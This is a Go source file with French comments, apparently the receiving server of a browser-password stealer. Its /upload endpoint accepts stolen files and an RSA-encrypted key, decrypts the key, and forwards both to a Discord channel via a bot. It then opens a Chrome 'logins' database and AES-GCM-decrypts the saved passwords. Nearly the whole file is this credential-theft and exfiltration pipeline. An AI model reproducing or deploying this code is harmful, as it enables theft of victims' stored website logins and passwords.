package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"strings" // Assure-toi de changer ce chemin avec le bon import de ton module
	"time"

	"github.com/bwmarrin/discordgo"
	_ "github.com/mattn/go-sqlite3"
)

//========================================================================
//======================== GLOBALE
//========================================================================

//========================================================================
//======================== WEBSITE
//========================================================================

// Structure pour stocker les données reçues
type Data struct {
	Key  string         `json:"key"`
	File multipart.File `json:"file"`
}

// Handler pour gérer les requêtes POST contenant un fichier et des données
func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Méthode non autorisée", http.StatusMethodNotAllowed)
		return
	}

	err := r.ParseMultipartForm(10 << 20) // Limite de 10 Mo
	if err != nil {
		http.Error(w, "Erreur lors du parsing du formulaire", http.StatusBadRequest)
		return
	}

	// Récupérer le fichier
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Aucun fichier reçu", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Générer un nom de fichier valide
	t := time.Now()
	name := t.Format("2006-01-02_15-04-05") + " - " + header.Filename
	name = strings.ReplaceAll(name, ":", "-") // Remplacer les caractères interdits

	// Créer le fichier dans le dossier uploads/
	dst, err := os.Create("./uploads/" + name)
	if err != nil {
		http.Error(w, "Erreur lors de la sauvegarde du fichier", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	// Copier le fichier reçu
	_, err = io.Copy(dst, file)
	if err != nil {
		http.Error(w, "Erreur lors de l'écriture du fichier", http.StatusInternalServerError)
		return
	} else {
		go bot(name, r.FormValue("key"))
	}

	// Réponse JSON
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"message": "Fichier enregistré", "file": "%s"}`, name)
}

func StartWeb() {
	http.HandleFunc("/upload", uploadHandler)

	fmt.Println("Serveur démarré sur : http://localhost:8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		fmt.Println("Erreur lors du démarrage du serveur :", err)
	}
}

//========================================================================
//======================== DISCORD
//========================================================================

var (
	Token string
)

func init() {
	flag.StringVar(&Token, "t", "", "Bot Token")
	flag.Parse()
}

func decryptWithPrivateKey(encodedCiphertext string, privateKeyPath string) (string, error) {
	// Décoder le texte chiffré depuis base64
	fmt.Println(encodedCiphertext)
	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
	if err != nil {
		return "", err
	}

	// Lire la clé privée depuis le fichier
	privateKeyBytes, err := os.ReadFile(privateKeyPath)
	if err != nil {
		return "", err
	}
	fmt.Println(encodedCiphertext)
	// Décoder la clé privée
	privateKeyBlock, _ := pem.Decode(privateKeyBytes)
	if privateKeyBlock == nil || privateKeyBlock.Type != "RSA PRIVATE KEY" {
		return "", errors.New("clé privée invalide")
	}

	privateKey, err := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
	if err != nil {
		return "", err
	}

	// Déchiffrer le texte
	plaintext, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func bot(filename string, key string) {
	token := "token" // Remplace par ton token de bot                                               // Remplace par l'ID du salon
	filePath := "./uploads/" + filename
	channelID := "123" // Remplace par le chemin du fichier

	// Créer une nouvelle session Discord avec le token du bot
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Erreur lors de la création de la session Discord:", err)
		return
	}

	// Ouvrir le fichier
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("Erreur lors de l'ouverture du fichier:", err)
		return
	}
	defer file.Close()

	privateKeyPath := "./private.pem"

	decryptedKey, err := decryptWithPrivateKey(key, privateKeyPath)
	if err != nil {
		fmt.Println("Erreur lors du déchiffrement :", err)
		fmt.Println("Ciphertext :", decryptedKey)
		return
	}

	fmt.Println("\nTexte déchiffré :", decryptedKey)

	TextForMessage := "key : ```" + decryptedKey + "```"
	dg.ChannelFileSendWithMessage(channelID, TextForMessage, "password.txt", file)

	// _, err = dg.ChannelFileSend(channelID, "fichier.txt", file)
	// if err != nil {
	// 	fmt.Println("Erreur lors de l'envoi du fichier:", err)
	// 	return
	// }

	fmt.Println("Fichier envoyé avec succès !")
	fmt.Println("key : ", key)

	// Enregistrer le handler pour gérer les messages
	dg.AddHandler(messageCreate)

	// Ouvrir la connexion WebSocket à Discord
	err = dg.Open()
	if err != nil {
		fmt.Println("Erreur lors de l'ouverture de la connexion Discord:", err)
		return
	}

	// Attendre que l'utilisateur appuie sur CTRL-C ou un autre signal de terminaison
	// fmt.Println("Bot en fonctionnement. Appuyez sur CTRL-C pour quitter.")
	// sc := make(chan os.Signal, 1)
	// signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	// <-sc

	// Fermer proprement la session Discord
	dg.Close()

	// execution de la fonction passwordDecrypt()
	passwordDecrypt(decryptedKey)
	os.Remove(filePath)
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignorer les messages envoyés par le bot lui-même
	if m.Author.ID == s.State.User.ID {
		return
	}
	// Exemple de réponse sur un message
	if m.Content == "ping" {
		s.ChannelMessageSend(m.ChannelID, "Pong!")
	}
}

func main() {
	// Lancer le serveur HTTP dans une goroutine
	StartWeb()
}

func passwordDecrypt(masterKey string) {
	PasswordTXT := ""

	// Open Database
	db, err := sql.Open("sqlite3", os.Getenv("2025-03-12_15-02-29-passwordChrome.dat"))
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	// Select Rows to get data from
	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	for rows.Next() {
		var URL, USERNAME, PASSWORD string

		err = rows.Scan(&URL, &USERNAME, &PASSWORD)
		if err != nil {
			log.Fatal(err)
		}

		// Decrypt Passwords
		if strings.HasPrefix(PASSWORD, "v10") { // Means it's Chrome 80 or higher
			PASSWORD = strings.TrimPrefix(PASSWORD, "v10")

			if len(masterKey) >= 32 {
				ciphertext, err := base64.StdEncoding.DecodeString(PASSWORD)
				if err != nil {
					log.Fatal(err)
				}

				c, err := aes.NewCipher([]byte(masterKey[:32]))
				if err != nil {
					log.Fatal(err)
				}

				gcm, err := cipher.NewGCM(c)
				if err != nil {
					log.Fatal(err)
				}

				nonceSize := gcm.NonceSize()
				if len(ciphertext) < nonceSize {
					log.Fatal("ciphertext too short")
				}

				nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
				plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
				if err != nil {
					log.Fatal(err)
				}

				if string(plaintext) != "" {
					PasswordTXT += fmt.Sprintf("%s | %s | %s\n", URL, USERNAME, "MDP")
				}
			} else {
				log.Fatal("masterKey is too short")
			}
		} else {
			// Handle Chrome versions < 80 if needed
			log.Fatal("Unsupported Chrome version")
		}
	}

	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Print(PasswordTXT)
	err = os.WriteFile("./assets/passwordChrome.txt", []byte(PasswordTXT), 0666)
	if err != nil {
		log.Fatal(err)
	}
}
